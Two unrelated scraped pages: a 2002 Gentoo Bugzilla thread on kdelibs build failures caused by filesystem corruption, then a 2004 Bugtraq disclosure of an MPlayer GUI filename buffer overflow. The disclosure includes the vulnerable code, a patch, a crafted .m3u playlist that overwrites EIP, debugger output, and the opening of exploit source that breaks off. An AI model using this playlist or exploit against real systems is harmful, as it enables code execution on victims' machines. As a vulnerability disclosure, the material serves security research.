=== Content from bugs.gentoo.org_12f7393c_20250126_071642.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 5545
something is wrong with kdelibs... or at least it seams...cannot compile kde
Last modified: 2003-01-13 19:49:44 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=5545&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=5545&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 5545**](show_bug.cgi?id=5545)
- something is wrong with kdelibs... or at least it seams...cannot compile kde

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
something is wrong with kdelibs... or at least it seams...cannot compile kde

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED INVALID | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Linux | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Linux "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | [OLD] KDE ([show other bugs](buglist.cgi?component=%5BOLD%5D%20KDE&product=Gentoo%20Linux&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | High normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo KDE team | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2002-07-24 23:19 UTC by Miguel Sousa Filipe | | --- | --- | | Modified: | 2003-01-13 19:49 UTC ([History](show_activity.cgi?id=5545)) | | CC List: | 2 users (show)  carpaski rigo | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=5545&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=5545&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Miguel Sousa Filipe    2002-07-24 23:19:15 UTC  ``` the problem is that I cannot emerge any component of kde, kdebase, kdemultimedia etc... they all stop at: /usr/kde/3/bin/kde-config: error while loading shared libraries: libkdecore.so.4: cannot open shared object file: No such file or directory configure: error: /usr/kde/3/bin/kde-config --prefix outputed the non existant prefix '' for kdelibs.                           This means it has been moved since you installed it.                           This won't work. Please recompile kdelibs for the new prefix.                             !!! ERROR: The ebuild did not complete successfully. !!! Function kde_src_compile, Line -4766, Exitcode 1 !!! died running ./configure, kde_src_compile:configure ```  [Comment 1](#c1)  Miguel Sousa Filipe    2002-07-24 23:35:05 UTC  ``` I forgot to say that this happened to me first with kdemultimedia, and after verifying that something was wrong since: [67p] tigre : /usr/src $ kde-config  kde-config: error while loading shared libraries: libkdecore.so.4: cannot open shared object file: No such file or directory  I re-emerged kdelibs, but with no avail. I was unable to understand why this happens, so I uninstalled all the kde packages I had in the system and re-emerged the whole kde ...well... arts and kdelibs emerged.. but kdebase didn't..  I just did ldconfig to see if it was a symple lack of updated ld.so.cache, but I found this: ldconfig: Cannot lstat /usr/kde/3/lib/libkdeprint.so.4: Permission denied ldconfig: Cannot lstat /usr/kde/3/lib/libshellscript.so.0: Permission denied ldconfig: Cannot lstat /usr/kde/3/lib/libkjava.so: Permission denied ldconfig: Cannot lstat /usr/kde/3/lib/libkdesu.so.4: Permission denied ldconfig: Cannot lstat /usr/kde/3/lib/libkio.so: Permission denied ldconfig: Cannot lstat /usr/kde/3/lib/libkjs.so: Permission denied ldconfig: Cannot lstat /usr/kde/3/lib/libkmid.so.0: Permission denied ldconfig: Cannot lstat /usr/kde/3/lib/libshellscript.so: Permission denied ...and so on... ldconfig: Can't link /usr/kde/3/lib/libkhtml.so.4 to libkhtml.so.4.0.0 ldconfig: Can't link /usr/kde/3/lib/libDCOP.so.4 to libDCOP.so.4.0.0 ldconfig: Can't link /usr/kde/3/lib/libkspell.so.4 to libkspell.so.4.0.0 ldconfig: Can't link /usr/kde/3/lib/libkmid.so.0 to libkmid.so.0.0.95 ldconfig: Can't link /usr/kde/3/lib/libkdeui.so.4 to libkdeui.so.4.0.0 ldconfig: Can't link /usr/kde/3/lib/libkscript.so.0 to libkscript.so.0.0.0 ...and so on....  for many symlinks in /usr/kde/3/lib/  [67p] tigre : /usr/src $ ll /usr/kde/3/lib/libkdecore.* ls: /usr/kde/3/lib/libkdecore.so.4: Permission denied 2639851 -rwxr-xr-x    1 root     root         1008 Jul 25 04:55 /usr/kde/3/lib/libkdecore.la* 2639850 -rwxr-xr-x    1 root     root         1.5M Jul 25 04:55 /usr/kde/3/lib/libkdecore.so.4.0.0*  so, this seems a error in the symlink creation... bad permissions... (the user above is root) ```  [Comment 2](#c2)  Dan Armak (RETIRED)   gentoo-dev  2002-07-25 06:42:08 UTC  ``` Are you sure you did it as root? There's a $ prompt not a # one. Maybe repeat ldconfig and the ls test a root?   Maybe this is a permission issue? Check your (user's) permissions for each directory in  the hierarchy /usr/kde/3/lib (i.e. kde, 3 and lib).   ```  [Comment 3](#c3)  Dan Armak (RETIRED)   gentoo-dev  2002-07-25 06:44:46 UTC  ``` Specifically give me root's output of:  ls -l /usr  ls -l /usr/kde  ls -l /usr/kde/3  ls -l /usr/kde/3/lib  ls -lL /usr/kde/lib    A bit large for bugzilla, so you can send it to danarmak@gentoo.org or attach  it to the bug.  ```  [Comment 4](#c4)  Low Kian seong    2002-08-21 12:55:36 UTC  ``` The kdelibs can be installed ( for those using gcc-3.1.1 ) using the 'dirty' hack outlined in the bugs report for arts that is :  create a sim-link in /usr/lib/gcc-lib/i686-pc-linux-gnu : 3.1 -> 3.1.1  This is for those who really got to have it done and cannot wait. Use at your own risk.  ```  [Comment 5](#c5)  Dan Armak (RETIRED)   gentoo-dev  2002-08-29 08:06:40 UTC  ``` Miguel: I'm sorry I left this issue like that. Could you please give me an  update on your current status wrt. kde?  ```  [Comment 6](#c6)  Miguel Sousa Filipe    2002-09-02 16:11:19 UTC  ``` danarmak: Sorry the lateness of the reply to your question.. I was on vacations.. returned just now. Well.. now, when I came back, after emerge rsync and emerge -u world, my gentoo is having some problems with arts... arts isn't compiling... and.. kdelibs is n ```  [Comment 7](#c7)  Miguel Sousa Filipe    2002-09-02 16:11:19 UTC  ``` danarmak: Sorry the lateness of the reply to your question.. I was on vacations.. returned just now. Well.. now, when I came back, after emerge rsync and emerge -u world, my gentoo is having some problems with arts... arts isn't compiling... and.. kdelibs is nº 2 in the queue of emerge -u world -p, right after arts...  Since.. my problem is now arts.. and if I'm not mistaken kdelibs depends on that package, i can only check the integrity of the kdelibs build after I solve this problem with arts.. I should post a bug about that soon.. since this bug entry isn't the right place to discuss arts problem I believe(right?).  bye for now..  Miguel Sousa Filipe ```  [Comment 8](#c8)  Miguel Sousa Filipe    2002-09-02 17:48:10 UTC  ``` Dan Armak:  the arts problem is solved and now I have the status report of kdelibs in my system, it compiled ok apparently.. but I had some errors while "merging to /"  here's the output:  >>> Completed installing into /mnt/aux/tmp/portage/kdelibs-3.0.3/image/  >>> Merging kde-base/kdelibs-3.0.3 to / ssl cups --- /etc/ --- /etc/env.d/ >>> /etc/env.d/65kdelibs-3.0.3 >>> /etc/env.d/50kdedir-3.0.3 --- /usr/ --- /usr/kde/ --- /usr/kde/3/ --- /usr/kde/3/bin/ >>> /usr/kde/3/bin/dcop >>> /usr/kde/3/bin/kded (...) >>> /usr/kde/3/bin/kpac_dhcp_helper >>> /usr/kde/3/bin/dcopobject >>> /usr/kde/3/bin/dcopidl2cpp >>> /usr/kde/3/bin/kab2kabc --- /usr/kde/3/lib/ Traceback (most recent call last):  File "/usr/bin/emerge", line 1387, in ?     mydepgraph.merge(mydepgraph.altlist())   File "/usr/bin/emerge", line 938, in merge     retval=portage.doebuild(y,"merge",myroot,edebug)   File "/usr/lib/python2.2/site-packages/portage.py", line 1133, in doebuild     return merge(settings["CATEGORY"],settings["PF"],settings["D"],settings["BUILDDIR"]+"/build-info",myroot,m yebuild=settings["EBUILD"])   File "/usr/lib/python2.2/site-packages/portage.py", line 1359, in merge     mylink.merge(pkgloc,infloc,myroot,myebuild)   File "/usr/lib/python2.2/site-packages/portage.py", line 3770, in merge     self.treewalk(mergeroot,myroot,inforoot,myebuild)   File "/usr/lib/python2.2/site-packages/portage.py", line 3495, in treewalk     self.mergeme(srcroot,destroot,outfile,secondhand,"",cfgfiledict,mymtime)   File "/usr/lib/python2.2/site-packages/portage.py", line 3658, in mergeme     self.mergeme(srcroot,destroot,outfile,secondhand,offset+x+"/",cfgfiledict,thismtime)   File "/usr/lib/python2.2/site-packages/portage.py", line 3658, in mergeme     self.mergeme(srcroot,destroot,outfile,secondhand,offset+x+"/",cfgfiledict,thismtime)   File "/usr/lib/python2.2/site-packages/portage.py", line 3658, in mergeme     self.mergeme(srcroot,destroot,outfile,secondhand,offset+x+"/",cfgfiledict,thismtime)   File "/usr/lib/python2.2/site-packages/portage.py", line 3658, in mergeme     self.mergeme(srcroot,destroot,outfile,secondhand,offset+x+"/",cfgfiledict,thismtime)   File "/usr/lib/python2.2/site-packages/portage.py", line 3652, in mergeme     os.mkdir(mydest) OSError: [Errno 5] Input/output error: '/usr/kde/3/lib/kde3' -------------//----------------- Dan do you remember the strange output of the /usr/kde/3/lib that I sent you some time ago.. where root didn't had permitions to list certain files... ..etc..? I bet that this bug is related to that "weirdness".. and this might be a filesystem error in my system... caused by god knows what... I really don't have the knowledge to "diagnose" the cause of the problem...  anyhow... kdelibs compile.. but don't get merged... and my feeling is that the error is OS related and not kde related...  that's it for know.. :-)  Miguel Sousa Filipe ```  [Comment 9](#c9)  Dan Armak (RETIRED)   gentoo-dev  2002-09-04 11:10:05 UTC  ``` Ouch. I'm afraid I'm somewhat out of my depth here.... Hm...  ```  [Comment 10](#c10)  Rigo    2002-10-03 05:47:22 UTC  ``` Different errors overhere with Beta2:  /bin/sh ../../libtool --silent --mode=link i686-pc-linux-gnu-gcc  -ansi -W -Wall -pedantic -Wshadow -Wpointer-arith -Wmissing-prototypes -Wwrite-strings -D_XOPEN_SOURCE=500 -D_BSD_SOURCE -DNDEBUG -O2  -march=pentium3 -O3 -pipe -fomit-frame-pointer -fforce-addr -falign-functions=4   -o make_driver_db_cups -L/usr/X11R6/lib -L/usr/qt/3/lib -L/usr/kde/3.1/lib  make_driver_db_cups.o ../libdriverparse.a ../../kdecore/libkdefakes.la -ldl -lz  make_driver_db_cups.o: In function `parsePpdFile': make_driver_db_cups.o(.text+0x35b): undefined reference to `gzgets' collect2: ld returned 1 exit status make[4]: *** [make_driver_db_cups] Fout 1 make[4]: *** Wachten op onafgeronde taken... make[4]: Weggaan uit map `/var/tmp/portage/kdelibs-3.1_beta2/work/kdelibs-3.0.8/kdeprint/cups' make[3]: *** [all-recursive] Fout 1 make[3]: Weggaan uit map `/var/tmp/portage/kdelibs-3.1_beta2/work/kdelibs-3.0.8/kdeprint/cups' make[2]: *** [all-recursive] Fout 1 make[2]: Weggaan uit map `/var/tmp/portage/kdelibs-3.1_beta2/work/kdelibs-3.0.8/kdeprint' make[1]: *** [all-recursive] Fout 1 make[1]: Weggaan uit map `/var/tmp/portage/kdelibs-3.1_beta2/work/kdelibs-3.0.8' make: *** [all] Fout 2  !!! ERROR: The ebuild did not complete successfully. !!! Function kde_src_compile, Line 83, Exitcode 2 !!! died running emake, kde_src_compile:make  I Better go check my CUPS (I never use by the way =)   Rigo ```  [Comment 11](#c11)  Rigo    2002-10-03 05:48:19 UTC  ``` *  net-print/qtcups       Latest version available: 2.0-r1       Latest version installed: [ Not Installed ]       Homepage: <http://cups.sourceforge.net>       Description: QT Frontend for the Common UNIX printing system  Do I need this ? DEP problem 4 me maybe ?  Rigo ```  [Comment 12](#c12)  Rigo    2002-10-03 09:14:02 UTC  ``` Done...For me it compiles fine now (beta2) --> Had to use -cups to compile.  Rigo ```  [Comment 13](#c13)  Dan Armak (RETIRED)   gentoo-dev  2002-10-03 11:33:23 UTC  ``` Rigo: your problem is (or should be ;-) a broken xfree. If you're using an early installation of xfree 4.2.1, that's it. Either emerge xfree again, or check if /usr/X11R6/lib/libz.a exists. If it does delete it, it should never exist. You can then compile with USE cups enabled.  ```  [Comment 14](#c14)  Dan Armak (RETIRED)   gentoo-dev  2002-10-03 11:34:46 UTC  ``` Miguel: the portage error you reported isn't likely to be caused by the ebuild,   so I'm letting Seemant or whoever redirect it as appropriate.   Bug wranglers: the emaining error is the portage traceback in [comment #7](show_bug.cgi?id=5545#c7).  ```  [Comment 15](#c15)  SpanKY   gentoo-dev  2002-10-03 14:17:28 UTC  ``` portage guys: check out [comment #7](show_bug.cgi?id=5545#c7) ... it was caused by filesystem errors, so i  dont know if you just want to punt this bug or put in error checking for it  ```  [Comment 16](#c16)  Dan Armak (RETIRED)   gentoo-dev  2002-12-11 07:47:26 UTC  ``` Me again. Update on current status? Have you tried fixing the perms by hand? Maybe it's not 'permanent' f/s corruption, but just something that happened once... What filesystem is it anyway? Have you tried running whatever thorough check fsck offers for it? (fsck.resiserfs fex. has a thorough check mode that's disabled by default.)  ```  [Comment 17](#c17)  Miguel Sousa Filipe    2002-12-16 19:24:26 UTC  ``` The system in wich the erros ocurred is gone! chmod'ing and chown'ing didn't work on that "sick" directory... i'm afraid this was some reiserfs bug that I happened to "withness" ..   so... i think this bug should be closed.. it had nothing to do with kde3 ..  when not even uid 0 can ls a file, chmod'ing it .. or erasing it..  something really is wrong .. I couldn't fix it.. so I erased everything and  did a 1.4rc install ..   I changed the bug to "INVALID"... it seemed apropriate... sorry i didn't said anything before.. i really stop paing attention to this  bug after that post about the FS error.  thanx anyway.. great job you're all doing .. i find some bugs now and  then... but almost all of them are fixed in 24hours! that's really great!  p.s.: I hope that, "gentoo" grows older and matures.. to become a rock  solid distro like debian.. or at least debian testing would be acceptable..  eh he he ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=5545)
* - [XML](show_bug.cgi?ctype=xml&id=5545)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=5545)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=5545&product=Gentoo%20Linux)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=5545&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=5545&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from marc.info_09407c3a_20250125_073429.html ===

```
[[prev in list](?l=bugtraq&m=108843896506099&w=2)] [[next in list](?l=bugtraq&m=108844000409449&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    MPlayer MeMPlayer.c
From:       [<c0ntex () open-security ! org>](?a=108844339600002&r=1&w=2)
Date:       [2004-06-27 22:00:39](?l=bugtraq&r=1&w=2&b=200406)
Message-ID: [20040627220039.10052.qmail () www ! securityfocus ! com](?i=20040627220039.10052.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=108844316930791&q=mbox) or [body](?l=bugtraq&m=108844316930791&q=raw)]

/*
  *****************************************************************************************************************
  $ An open security advisory #5 - MPlayer GUI filename handling overflow
  *****************************************************************************************************************
  1: Bug Researcher: c0ntex@open-security.org
  2: Bug Released: June 28th 2004
  3: Bug Impact Rate: Medium / Hi
  4: Bug Scope Rate: Remote / Local
  *****************************************************************************************************************

  *****************************************************************************************************************

  MPlayer Media Player
  <http://www.mplayerhq.hu>

  MPlayer is a movie player for Linux (runs on many other Unices, and non-x86 CPUs, \
see Ports). It plays most  MPEG, VOB, AVI, OGG/OGM, VIVO, ASF/WMA/WMV, QT/MOV/MP4, \
FLI, RM, NuppelVideo, yuv4mpeg, FILM, RoQ, PVA,  Matroska files, supported by many \
native, XAnim, RealPlayer, and Win32 DLL codecs. You can watch VideoCD,  SVCD, DVD, \
3ivx, RealMedia, Sorenson, Theora, and DivX movies too.

  All versions of MPlayer, including the latest [MPlayer-1.0pre4] when compiled with \
GUI support are vulnerable  to a buffer overflow attack that will provide hostile \
code execution.

  The MPlayer source requires explicit setting to enable the GUI, though support is \
enabled on a multitude of  default systems / setups, those I tested are below:

  Tested OS:
          Redhat Linux with Gnome
          FreeBSD and latest cvsup + ports with Gnome

  ./MPlayer-1.0pre4/Gui/mplayer/common.c
  inline void TranslateFilename( int c,char * tmp )
  ...
  ... snip
  ...
  case STREAMTYPE_FILE:
             if ( ( guiIntfStruct.Filename )&&( guiIntfStruct.Filename[[0]](#0) ) )
	     {
             if ( strrchr( guiIntfStruct.Filename,'/' ) ) strcpy( tmp,strrchr( \
guiIntfStruct.Filename,'/' ) + 1);  else strcpy( tmp,guiIntfStruct.Filename);
             if ( tmp[strlen( tmp ) - 4] == '.' ) tmp[strlen( tmp ) - 4]=0;
             if ( tmp[strlen( tmp ) - 5] == '.' ) tmp[strlen( tmp ) - 5]=0;
             } else strcpy( tmp,MSGTR_NoFileLoaded );

  POC fix purposes only.
  [c0ntex@exploited MPlayer-1.0pre4]$ cat mplayer_gui.patch

  --- Gui/mplayer/common.c        2003-03-20 12:42:09.000000000 +0000
  +++ Gui-new/mplayer/common.c    2004-06-02 00:01:43.000000000 +0100
  @@ -43,8 +43,8 @@
  case STREAMTYPE_FILE:
              if ( ( guiIntfStruct.Filename )&&( guiIntfStruct.Filename[[0]](#0) ) )
              {
  -           if ( strrchr( guiIntfStruct.Filename,'/' ) ) strcpy( tmp,strrchr( \
                guiIntfStruct.Filename,'/' ) + 1 );
  -            else strcpy( tmp,guiIntfStruct.Filename );
  +           if ( strrchr( guiIntfStruct.Filename,'/' ) ) strncpy( tmp,strrchr( \
guiIntfStruct.Filename,'/', ) + 1, 511 ); tmp[512]='\0';  +            else strncpy( \
                tmp,guiIntfStruct.Filename, 511); tmp[512]='\0';
              if ( tmp[strlen( tmp ) - 4] == '.' ) tmp[strlen( tmp ) - 4]=0;
              if ( tmp[strlen( tmp ) - 5] == '.' ) tmp[strlen( tmp ) - 5]=0;
  -           } else strcpy( tmp,MSGTR_NoFileLoaded );
  +           } else strncpy( tmp,MSGTR_NoFileLoaded, 511 ); tmp[512]='\0';

  Attack choices:
     		1. Create my own fake HTTP listener and inject the phoney name.  (Static)(POC)
     		2. Build my own MPEG / MP3 or other static media file and header information. \
                (Mobile)
     		3. Create a media file that references another file by name. (Mobile)

  Found in network.c is the following table of demux types:

  extensions_table[] = {
  { "mpeg",DEMUXER_TYPE_MPEG_PS },
  { "mpg", DEMUXER_TYPE_MPEG_PS },
  { "mpe", DEMUXER_TYPE_MPEG_ES },
  { "avi", DEMUXER_TYPE_AVI },
  { "mov", DEMUXER_TYPE_MOV },
  { "qt",  DEMUXER_TYPE_MOV },
  { "asx", DEMUXER_TYPE_ASF },
  { "asf", DEMUXER_TYPE_ASF },
  { "wmv", DEMUXER_TYPE_ASF },
  { "wma", DEMUXER_TYPE_ASF },
  { "viv", DEMUXER_TYPE_VIVO },
  { "rm",  DEMUXER_TYPE_REAL },
  { "ra",  DEMUXER_TYPE_REAL },
  { "y4m", DEMUXER_TYPE_Y4M },
  { "mp3", DEMUXER_TYPE_AUDIO },
  { "ogg", DEMUXER_TYPE_OGG },
  { "wav", DEMUXER_TYPE_AUDIO },
  { "pls", DEMUXER_TYPE_PLAYLIST },
  { "m3u", DEMUXER_TYPE_PLAYLIST }
  };

  of which m3u & pls playlists were used. MPlayer does not restrict the length of \
links for M3U playlist entries,  which is a nice feature. - .pls in the end turned \
out to be useless for me though. I have not checked the other  muxors, maybe with \
tricks like creating a large ID3 itag for mpg and the likes will be interesting...

  [c0ntex@exploited MemPlayer-1.0pre4] mv test h0t_ladies.m3u

  [root@darkside htdocs]# cat ./h0t_ladies.m3u
  #EXTM3U
  #EXTINF:0x00,Open Security Rocks - c0ntex at open-security dot org - visit \
<http://open-security.org>  mp3_stash/Open-Security Rock[s]1.mpeg
  #EXTINF:0x01,Open Security Rocks - c0ntex at open-security dot org - visit \
<http://open-security.org>  mp3_stash/Open-Security Rock[s[]2.mpg
  #EXTINF:0x01,Open Security Rocks - c0ntex at open-security dot org - visit \
<http://open-security.org>  mp3_stash/Open-Security Rock[s[]3.mp3
  #EXTINF:0x02,Open Security Rocks - c0ntex at open-security dot org - visit \
<http://open-security.org>  \
mp3_stash/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  [root@darkside htdocs]#

  In my .m3u file, I embed 4 entries, the first three please the user with selected \
fine music from the Open-Security  MP3 archive, the 4th will crash MPlayer by placing \
the address 0x41414141 in EIP.

  Edit ./mplayer.c in vi and comment out the line:

        signal(SIGSEGV,exit_sighandler); // segfault

  Test run:
  [c0ntex@exploited MemPlayer-1.0pre4]$ ./gmplayer \
<http://open-security.org/pr0n/h0t_ladies.m3u>

  Using GNU internationalization
  Original domain: messages
  Original dirname: /usr/share/locale
  Current domain: mplayer
  Current dirname: /usr/local/share/locale

  MPlayer 1.0pre4-3.2.2 (C) 2000-2004 MPlayer Team
  ...
  ...
  Playing <http://192.168.1.1/members/secure/a/1/h0t_ladies.m3u>.
  Connecting to server 192.168.1.1[192.168.1.1]:80 ...
  Cache size set to 8192 KBytes
  Connected to server: 192.168.1.1
  ...
  ...
  Playing <http://192.168.1.1/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
  Connecting to server 192.168.1.1[192.168.1.1]:80 ...
  Server returned 404: Access Denied
  Unable to open URL: \
<http://192.168.1.1/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
  Segmentation fault (core dumped)

  [c0ntex@exploited MPlayer-1.0pre4]$ gdb ./gmplayer ./core.*
  (gdb) i r eip esp
  eip            0x41414141       0x41414141
  esp            0xbfffc800       0xbfffc800
  (gdb) i r
  eax            0x84a3640        139081280
  ecx            0x42006f24       1107324708
  edx            0xff000000       -16777216
  ebx            0x41414141       1094795585
  esp            0xbfffc800       0xbfffc800
  ebp            0x41414141       0x41414141
  esi            0x41414141       1094795585
  edi            0x41414141       1094795585
  eip            0x41414141       0x41414141
  eflags         0x10282  66178
  cs             0x23     35
  ss             0x2b     43
  ds             0x2b     43
  es             0x2b     43
  fs             0x0      0
  gs             0x33     51
  (gdb) bt
  #0  0x41414141 in ?? ()
  Cannot access memory at address 0x41414141
  (gdb) x/x 0xbfffc800
  0xbfffc800:       0x41414141   <--- A represents our payload.
  (gdb)

  Worked a treat.

  ---

  MPlayer bug discovered 28th May 2004
  MPlayer bug research completed 29th May 2004
  MPlayer developers contacted 1st June 2004
  MPlayer bug public release 28th June 2004

  No feedback at all from MPlayer team about this though I did find a post on their \
newsgroup:

		<http://mplayerhq.hu/pipermail/mplayer-dev-eng/2004-June/026559.html>

  cheers
  c0ntex@open-security.org
  <http://www.open-security.org>

 */

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define SUCCESS 0	/* True */
#define FAILURE 1	/* False */

#define A_BANNER	"_MPlayer_MeMPlayer_Media_Mayhem_"
#define ALIGN		0			/* Stack address alignment */
#define BUFFER		544			/* Exactly overwrite EIP */
